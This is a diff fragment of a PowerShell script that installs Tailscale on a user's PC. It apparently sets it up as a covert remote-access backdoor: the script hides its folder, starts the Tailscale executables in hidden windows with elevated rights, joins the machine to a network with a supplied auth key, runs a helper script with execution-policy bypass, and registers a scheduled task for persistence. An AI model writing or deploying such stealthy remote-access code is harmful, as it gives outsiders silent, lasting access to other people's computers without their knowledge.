@@ -35,12 +35,13 @@ function installTailscale {
   Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
   ## Configure Tailscale on users pc
+  Move-Item ".\notify.ps1" "C:\tailscale"
   Set-Location C:\tailscale
   Start-Sleep 2
-  Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -ep bypass -Verb RunAs
-  Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList 'up --authkey $authKey'
-  Start-Process -FilePath ".\tailscale-ipn.exe" -windowstyle hidden -ep bypass -Verb RunAs
-  Start-Process -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList -FilePath ".\notify.ps1"  C:\Tailscale\tailscale-ipn.exe Hide
+  Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
+  Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey'
+  Start-Process -FilePath ".\tailscale-ipn.exe" -windowstyle hidden -Verb RunAs
+  powershell -windowstyle hidden -ep bypass .\notify.ps1 
 
   ## Adds Tailscale to task scheduler
   $name = "Tailscale"
